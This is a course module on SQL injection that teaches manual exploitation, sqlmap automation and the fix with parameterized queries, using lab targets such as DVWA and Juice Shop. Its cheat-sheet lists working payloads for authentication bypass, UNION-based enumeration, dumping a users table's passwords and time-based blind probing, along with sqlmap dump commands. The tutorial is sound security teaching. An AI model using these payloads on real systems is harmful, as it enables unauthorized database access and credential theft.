# Module 15 — SQL Injection

> *When user input reaches a query unescaped, you can read the whole database — learn it by hand before you automate it.*

**The goal.** Understand every class of SQL injection, exploit them manually first (so you understand what's happening), then with `sqlmap`, and finally fix the code with parameterization. SQLi is old, still everywhere, and the single best teacher of "why input handling matters."

**Where it fits.** It's OWASP A03 (Injection) important enough for its own module. It builds directly on Module 14's web-app testing workflow.

## Concepts that matter

- **The root cause.** Input is concatenated into a query string instead of passed as a bound parameter, so data becomes code.
- **The types.**
  - *In-band / error-based* — the app returns data or DB errors directly.
  - *Union-based* — append `UNION SELECT` to pull data from other tables.
  - *Blind boolean* — no data returned, but true/false conditions change the response.
  - *Blind time-based* — infer bits by making the DB sleep.
  - *Out-of-band* — exfiltrate via a DNS/HTTP callback.
- **Fix once, correctly.** Parameterized queries / prepared statements make injection structurally impossible.

## Command cheat-sheet

```sql
-- --- Manual detection (paste into a vulnerable field/param) ---
'                       -- does a single quote break the query? (error = lead)
' OR '1'='1             -- classic auth-bypass / always-true
' ORDER BY 5 --         -- find the column count (increment until it errors)
' UNION SELECT 1,2,3 -- -- confirm injectable columns

-- --- Enumerate the database (union-based) ---
' UNION SELECT database(),version(),user() -- 
' UNION SELECT table_name,2 FROM information_schema.tables -- 
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- 
' UNION SELECT username,password FROM users -- 

-- --- Blind (boolean / time) ---
' AND 1=1 --            -- page normal
' AND 1=2 --            -- page differs → boolean-blind confirmed
' AND SLEEP(5) --       -- delayed response → time-blind confirmed
```

```bash
# --- Then automate & verify with sqlmap ---
sqlmap -u "http://TARGET/item?id=1" --batch --dbs           # find databases
sqlmap -u "http://TARGET/item?id=1" -D shop --tables
sqlmap -u "http://TARGET/item?id=1" -D shop -T users --dump
sqlmap -r request.txt --batch --level 3 --risk 2            # from a saved Burp request
```

## Walk it in your lab

Target: **DVWA** (set security to Low, then Medium) and **OWASP Juice Shop**.

1. Break the query with a single quote; read the error.
2. Find the column count with `ORDER BY`, then confirm injectable columns with `UNION SELECT`.
3. Enumerate `information_schema` to map tables/columns; dump the `users` table by hand.
4. Re-do it with `sqlmap` and compare — appreciate what the tool automates.
5. Open the vulnerable code, rewrite it with a **parameterized query**, and watch every payload above fail.

## What good looks like

A manual walkthrough (quote → column count → union → data) with the exact payloads and responses, then the `sqlmap` confirmation, then the fixed code proving the vulnerability is gone. The before/after is the lesson.

## Detection & defence

| Weakness | Defence |
|---|---|
| Concatenated queries | **Parameterized queries / prepared statements** (the real fix) |
| Over-privileged DB user | Least-privilege DB accounts; no `FILE`/admin rights for the app |
| Verbose DB errors | Generic error pages; log details server-side |
| Automated SQLi probing | WAF as a stopgap (not a substitute for fixing the code) |

## Common junior mistakes

- Reaching for `sqlmap` first and never learning what it's doing — you'll be lost on a WAF-protected or custom target.
- Reporting SQLi without dumping a harmless proof value; claim needs evidence.
- "Fixing" with input filtering/escaping instead of parameterization — filters get bypassed.

## Go deeper

- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) · [PortSwigger SQLi labs](https://portswigger.net/web-security/sql-injection)

---

> New here? Start with the **[lab setup guide](../LAB-SETUP.md)** and work the modules in order.
